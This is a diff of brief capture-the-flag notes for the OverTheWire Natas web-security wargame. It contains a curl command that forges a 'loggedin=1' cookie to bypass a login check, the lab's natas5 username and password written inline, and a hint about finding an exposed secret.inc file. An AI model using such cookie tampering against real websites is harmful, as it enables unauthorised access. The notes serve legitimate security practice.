@@ -1,12 +1,17 @@
 Natas 4:
 
-T.T.K = loggen in boolean ,cookie ,curl command (Terminal)
+      T.T.K = loggen in boolean ,cookie ,curl command (Terminal)
 
-M.A = using curl to change cookies
-----------------------------------------------------------------------------------------------------------------------------
-curl -v --cookie "loggedin=1" http://natas5.natas.labs.overthewire.org/ \
--u natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+      M.A = using curl to change cookies
+      ----------------------------------------------------------------------------------------------------------------------------
+      curl -v --cookie "loggedin=1" http://natas5.natas.labs.overthewire.org/ \
+      -u natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
 
----------------------------------------------------------------------------------------------------------------------------
+      ---------------------------------------------------------------------------------------------------------------------------
 
-http://cpansearch.perl.org/src/DOHERTY/Hack-Natas-0.003/walkthrough/natas-5.mkdn
+      http://cpansearch.perl.org/src/DOHERTY/Hack-Natas-0.003/walkthrough/natas-5.mkdn
+      
+Natas 6:
+   Google " natas6 secret.inc " Hint: from the source code we will know there exists a file called secret.inc
+  
+
